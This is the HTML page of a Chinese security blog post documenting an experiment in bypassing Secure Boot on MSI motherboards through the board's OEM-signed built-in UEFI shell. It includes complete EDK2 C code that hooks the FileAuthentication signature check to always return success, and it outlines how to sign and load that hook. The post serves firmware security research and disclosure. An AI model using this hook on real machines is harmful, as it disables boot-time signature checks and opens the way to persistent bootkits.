@@ -1,0 +1,229 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>记一次（真）邪修实验之MSI Bomb Shell | Ivy Shaw's Blog</title><meta name="keywords" content="cyberspace security"><meta name="author" content="Ivy"><meta name="copyright" content="Ivy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="MSI Bomb Shell —— 你的指针无处遁形微星自带一个uefi shell的启动项，并且这个shell是被OEM私钥签名之后放到固件里边的，因此在安全启动开启的情况下也可以直接运行，执行任何命令 在Secure Boot开启情况下可执行mm这类命令微星主板的Secure Boot有两种权限分级  针对某些非 UEFI 或不兼容的硬件&#x2F;操作系统设置“硬件&#x2F;操作系统兼容性”并优化功能，或者设">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次（真）邪修实验之MSI Bomb Shell">
+<meta property="og:url" content="http://example.com/2025/10/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%EF%BC%88%E7%9C%9F%EF%BC%89%E9%82%AA%E4%BF%AE%E5%AE%9E%E9%AA%8C%E4%B9%8BMSI-Bomb-Shell/index.html">
+<meta property="og:site_name" content="Ivy Shaw&#39;s Blog">
+<meta property="og:description" content="MSI Bomb Shell —— 你的指针无处遁形微星自带一个uefi shell的启动项，并且这个shell是被OEM私钥签名之后放到固件里边的，因此在安全启动开启的情况下也可以直接运行，执行任何命令 在Secure Boot开启情况下可执行mm这类命令微星主板的Secure Boot有两种权限分级  针对某些非 UEFI 或不兼容的硬件&#x2F;操作系统设置“硬件&#x2F;操作系统兼容性”并优化功能，或者设">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/img/5s.jpg">
+<meta property="article:published_time" content="2025-10-15T07:51:35.000Z">
+<meta property="article:modified_time" content="2026-03-17T08:09:26.049Z">
+<meta property="article:author" content="Ivy">
+<meta property="article:tag" content="cyberspace security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/5s.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/2025/10/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%EF%BC%88%E7%9C%9F%EF%BC%89%E9%82%AA%E4%BF%AE%E5%AE%9E%E9%AA%8C%E4%B9%8BMSI-Bomb-Shell/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '记一次（真）邪修实验之MSI Bomb Shell',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-03-17 16:09:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">40</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/5s.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ivy Shaw's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">记一次（真）邪修实验之MSI Bomb Shell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-10-15T07:51:35.000Z" title="Created 2025-10-15 15:51:35">2025-10-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-03-17T08:09:26.049Z" title="Updated 2026-03-17 16:09:26">2026-03-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="记一次（真）邪修实验之MSI Bomb Shell"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="MSI-Bomb-Shell-——-你的指针无处遁形"><a href="#MSI-Bomb-Shell-——-你的指针无处遁形" class="headerlink" title="MSI Bomb Shell —— 你的指针无处遁形"></a>MSI Bomb Shell —— 你的指针无处遁形</h3><p>微星自带一个uefi shell的启动项，并且这个shell是被OEM私钥签名之后放到固件里边的，因此在安全启动开启的情况下也可以直接运行，执行任何命令</p>
+<h4 id="在Secure-Boot开启情况下可执行mm这类命令"><a href="#在Secure-Boot开启情况下可执行mm这类命令" class="headerlink" title="在Secure Boot开启情况下可执行mm这类命令"></a>在Secure Boot开启情况下可执行mm这类命令</h4><p>微星主板的Secure Boot有两种权限分级</p>
+<blockquote>
+<p>针对某些非 UEFI 或不兼容的硬件/操作系统设置“硬件/操作系统兼容性”并优化功能，<br>或者设置“最高安全性”以全面验证所有已安装的组件。</p>
+</blockquote>
+<img src="/msibombshell/1.jpg" alt="1" style="zoom: 33%;" />
+
+<p>比如说体现在，如果是Hardware/OS Compatibility的情况下，uefi shell及其内部命令可执行，文件系统下的脚本也可执行；但是在Max Security的情况下，uefi shell及其内部命令可执行，但是未签名的脚本不可执行</p>
+<img src="/msibombshell/2.jpg" alt="1" style="zoom: 33%;" />
+
+<p>可利用性：</p>
+<ol>
+<li>uefi shell自带了内存读写的指令，在任何情况下都可以强制执行</li>
+<li>可以自己构造startup.nsh，从而在进入uefi shell的时候就自动执行</li>
+</ol>
+<h4 id="内存中暴露的Protocol-Interface指针"><a href="#内存中暴露的Protocol-Interface指针" class="headerlink" title="内存中暴露的Protocol Interface指针"></a>内存中暴露的Protocol Interface指针</h4><p>CoreStartImage函数用于执行StartImage()函数调用，即运行一个EFI可执行镜像或者application</p>
+<p>其中使用到了gSecurity2-&gt;FileAuthentication()，作为运行之前的Secure Boot验证步骤</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (gSecurity2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    SecurityStatus = gSecurity2-&gt;FileAuthentication(...);</span><br><span class="line">    <span class="keyword">if</span> (!EFI_ERROR (SecurityStatus) &amp;&amp; ImageIsFromFv) &#123;</span><br><span class="line">        ASSERT (gSecurity != <span class="literal">NULL</span>);</span><br><span class="line">        SecurityStatus = gSecurity-&gt;FileAuthenticationState(...);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((gSecurity != <span class="literal">NULL</span>) &amp;&amp; (OriginalFilePath != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    SecurityStatus = gSecurity-&gt;FileAuthenticationState(...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里之后没有else的分支，因此网上PoC的思路是：将gSecurity2和gSecurity协议指针清零，利用这里没有异常处理代码，可以绕过EFI运行前的验证</p>
+<p>gSecurity2这种已注册的协议是通过gBS-&gt;LocateProtocol方法在内存中检索指针，获取到指针之后再去访问协议下的函数/方法</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EFI_SECURITY2_ARCH_PROTOCOL       *gSecurity2     = <span class="literal">NULL</span>;</span><br><span class="line">Status = gBS-&gt;LocateProtocol(&amp;gEfiSecurity2ArchProtocolGuid, <span class="literal">NULL</span>, &amp;gSecurity2);</span><br><span class="line"><span class="keyword">if</span> (Status != EFI_SUCCESS) &#123;</span><br><span class="line">    Print(<span class="string">L&quot;LocateProtocol(gSecurity2) failed: %r\n&quot;</span>, Status);</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Print(<span class="string">L&quot;gSecurity2 protocol interface pointer = 0x%p\n&quot;</span>, gSecurity2);</span><br><span class="line">Print(<span class="string">L&quot;FileAuthentication function pointer   = 0x%p\n&quot;</span>, gSecurity2-&gt;FileAuthentication);</span><br></pre></td></tr></table></figure>
+
+<p>写了一个脚本，通过gBS的函数是能直接拿到协议指针地址，以及协议下FileAuthentication函数的地址</p>
+<p>在本机上用qemu连windbg，可以看到在启动过程中哪些协议被注册了</p>
+<img src="/msibombshell/3.jpg" alt="1" style="zoom: 50%;" />
+
+<p>圈出来的两个是gSecurity2和gSecurity，他们同时被注册，因此可以先试试把gSecurity2指针清零</p>
+<p>uefi shell中提供了一个叫mm的指令，可以直接修改系统内存，不需要任何权限</p>
+<p>在运行mm指令后，用dmem检查发现确实把指针修改了</p>
+<p>此时再次运行gBS-&gt;LocateProtocol(&amp;gEfiSecurity2ArchProtocolGuid, NULL, &amp;gSecurity2)，会被卡死（uefi没有异常处理机制）</p>
+<img src="/msibombshell/4.png" alt="1" style="zoom: 33%;" />
+
+<p>我这里尝试运行了一下其他脚本，比如读取另外的protocol，发现也卡死了</p>
+<img src="/msibombshell/5.png" alt="1" style="zoom: 33%;" />
+
+<p>查了资料，<code>gBS-&gt;LocateProtocol()</code> 的核心逻辑大概如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LocateProtocol(Guid, Registration, Interface)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 遍历全局 Protocol Database 链表</span></span><br><span class="line">    <span class="function"><span class="keyword">for</span> <span class="title">each</span> <span class="params">(ProtocolEntry in gProtocolDatabaseList)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (CompareGuid(ProtocolEntry-&gt;Guid, Guid)) &#123;</span><br><span class="line">            *Interface = ProtocolEntry-&gt;Interface;  <span class="comment">// 从结构体中取出指针</span></span><br><span class="line">            <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EFI_NOT_FOUND;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，它不仅仅是查表，还会：</p>
+<ul>
+<li>遍历一个链表；</li>
+<li>对链表节点的内容（包括 <code>Guid</code>、<code>Interface</code> 等）进行读取；</li>
+<li>其中某些字段（尤其是 Interface）在 DXE 阶段常常是指针指向另一个结构体。</li>
+</ul>
+<blockquote>
+<p>DXE 框架维护的 Protocol Database 是一个双向链表（<code>LIST_ENTRY</code>），每个协议接口实例都挂在 <code>Handle-&gt;ProtocolList</code> 上。</p>
+</blockquote>
+<p>在修改之后，实际上破坏了链表结构，导致这个for循环进行不下去了</p>
+<p>然后，我写了一个没有用到gBS-&gt;LocateProtocol方法的一个efi app（打印系统信息），模拟植入的efi后门程序</p>
+<img src="/msibombshell/6.png" alt="1" style="zoom: 33%;" />
+
+<p>重复刚才的操作，将指针清零，发现这里并没有输出结果，并且访问了gSecurity2的指针，然后报错了</p>
+<img src="/msibombshell/7.png" alt="1" style="zoom: 33%;" />
+
+<p>在实机上测试，发现UefiInfo还是能够运行，上面的报错应该是qemu模拟器的某种问题</p>
+<img src="/msibombshell/8.jpg" alt="1" style="zoom: 33%;" />
+
+<p>这里我将gSecurity和gSecurity2指针同时在内存中清零，然后通过gBS-&gt;LocateProtocol来访问，均返回NULL了</p>
+<img src="/msibombshell/9.jpg" alt="1" style="zoom: 33%;" />
+
+<h4 id="通过Hook验证函数实现Secure-Boot绕过"><a href="#通过Hook验证函数实现Secure-Boot绕过" class="headerlink" title="通过Hook验证函数实现Secure Boot绕过"></a>通过Hook验证函数实现Secure Boot绕过</h4><p>在加载一个efi image或者通过uefi shell 运行efi脚本时，gSecurity2-&gt;FileAuthentication 负责对这个文件进行签名校验</p>
+<p>edk2的实现如下，下游厂商应该都是沿用的这一套验证机制</p>
+<p>既然通过将gSecurity2和gSecurity的指针清零也无法绕过这个判断逻辑（可能LocateProtocol会从其他地方再次获取指针），那就可以考虑从函数本身下手</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (gSecurity2 != <span class="literal">NULL</span>) </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Verify File Authentication through the Security2 Architectural Protocol</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SecurityStatus = gSecurity2-&gt;FileAuthentication (</span><br><span class="line">                                  gSecurity2,</span><br><span class="line">                                  OriginalFilePath,</span><br><span class="line">                                  FHand.Source,</span><br><span class="line">                                  FHand.SourceSize,</span><br><span class="line">                                  BootPolicy</span><br><span class="line">                                  );</span><br><span class="line">    <span class="keyword">if</span> (!EFI_ERROR (SecurityStatus) &amp;&amp; ImageIsFromFv) &#123;</span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// When Security2 is installed, Security Architectural Protocol must be published.</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      ASSERT (gSecurity != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// Verify the Authentication Status through the Security Architectural Protocol</span></span><br><span class="line">      <span class="comment">// Only on images that have been read using Firmware Volume protocol.</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      SecurityStatus = gSecurity-&gt;FileAuthenticationState (</span><br><span class="line">                                    gSecurity,</span><br><span class="line">                                    AuthenticationStatus,</span><br><span class="line">                                    OriginalFilePath</span><br><span class="line">                                    );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">......</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check Security Status.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (EFI_ERROR (SecurityStatus) &amp;&amp; SecurityStatus != EFI_SECURITY_VIOLATION) &#123;</span><br><span class="line">    <span class="keyword">if</span> (SecurityStatus == EFI_ACCESS_DENIED) &#123;</span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// Image was not loaded because the platform policy prohibits the image from being loaded.</span></span><br><span class="line">      <span class="comment">// It&#x27;s the only place we could meet EFI_ACCESS_DENIED.</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      *ImageHandle = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Status = SecurityStatus;</span><br><span class="line">    Image = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">goto</span> Done;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Track the return status from LoadImage.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (Image != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    Image-&gt;LoadImageStatus = Status;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Secure Boot的验证结果实际上取的是 CoreLoadImageCommon 函数的返回值 Status = SecurityStatus，因此hook的目标就是gSecurity2-&gt;FileAuthentication</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EFI_STATUS</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">MyFileAuthenticationHook</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN CONST EFI_SECURITY2_ARCH_PROTOCOL  *This,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN CONST EFI_DEVICE_PATH_PROTOCOL     *File,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN VOID                               *FileBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN UINTN                              FileSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN BOOLEAN                            BootPolicy</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// Print(L&quot;[+] FileAuthentication Hook Triggered!\n&quot;);</span></span><br><span class="line">  <span class="comment">// Print(L&quot;    FileBuffer: 0x%p, FileSize: 0x%lx, BootPolicy: %d\n&quot;, FileBuffer, FileSize, BootPolicy);</span></span><br><span class="line"></span><br><span class="line">  EFI_STATUS Status = OriginalFileAuthentication(This, File, FileBuffer, FileSize, BootPolicy);</span><br><span class="line">  <span class="comment">// Print(L&quot;[+] Original FileAuthentication returned: %r\n&quot;, Status);</span></span><br><span class="line">  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EFI_STATUS</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">UefiMain</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN EFI_HANDLE ImageHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN EFI_SYSTEM_TABLE *SystemTable</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  EFI_STATUS Status;</span><br><span class="line"></span><br><span class="line">  Status = gBS-&gt;LocateProtocol(&amp;gEfiSecurity2ArchProtocolGuid, <span class="literal">NULL</span>, (VOID**)&amp;gSecurity2);</span><br><span class="line">  <span class="keyword">if</span> (EFI_ERROR(Status)) &#123;</span><br><span class="line">    Print(<span class="string">L&quot;[-] LocateProtocol(Security2) failed: %r\n&quot;</span>, Status);</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Print(<span class="string">L&quot;[+] Located gSecurity2: 0x%p\n&quot;</span>, gSecurity2);</span><br><span class="line"></span><br><span class="line">  OriginalFileAuthentication = gSecurity2-&gt;FileAuthentication;</span><br><span class="line"></span><br><span class="line">  gSecurity2-&gt;FileAuthentication = MyFileAuthenticationHook;</span><br><span class="line"></span><br><span class="line">  Print(<span class="string">L&quot;[+] FileAuthentication Hook installed successfully!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是微星主板实际上设计的有一些缺陷：</p>
+<ol>
+<li><p>edk2本来自己写了一个uefi shell的参考实现，大部分下游厂商都把它编译到固件里边了，然后微星在做OEM签名的时候偷懒，把固件里边所有efi都给签名了，就是所谓的”Built in Shell“</p>
+</li>
+<li><p>在没设置bios口令的情况下setup界面是可以随意操作的，甚至微星还自己做了一个一键式签名的功能，Secure Boot像是形同虚设</p>
+<img src="/msibombshell/10.jpg" alt="1" style="zoom: 33%;" /></li>
+<li><p>关于1的问题，一直到今年9月份才有人关注，这个PR之后的EDK2 shell在secure boot开启的情况下，只有签名了才能运行（这个问题技嘉很早自行解决了，但是微星目前还没有发布bios的对应更新，最新的产品应该都能利用）</p>
+</li>
+</ol>
+<img src="/msibombshell/11.png" alt="1" style="zoom: 33%;" />
+
+<p>整体的利用思路是，通过这个签名机制把hook脚本签名，然后进到uefi shell里边load hook，最后可以执行任意efi脚本</p>
+<img src="/msibombshell/12.png" alt="1" style="zoom: 33%;" />
+
+<p>不考虑微星设计缺陷的情况下，感觉可以先利用Insyde证书注入的洞，在操作系统里边把hook脚本签名了，然后也能达到一样的效果</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Ivy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/10/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%EF%BC%88%E7%9C%9F%EF%BC%89%E9%82%AA%E4%BF%AE%E5%AE%9E%E9%AA%8C%E4%B9%8BMSI-Bomb-Shell/">http://example.com/2025/10/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%EF%BC%88%E7%9C%9F%EF%BC%89%E9%82%AA%E4%BF%AE%E5%AE%9E%E9%AA%8C%E4%B9%8BMSI-Bomb-Shell/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/5s.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a 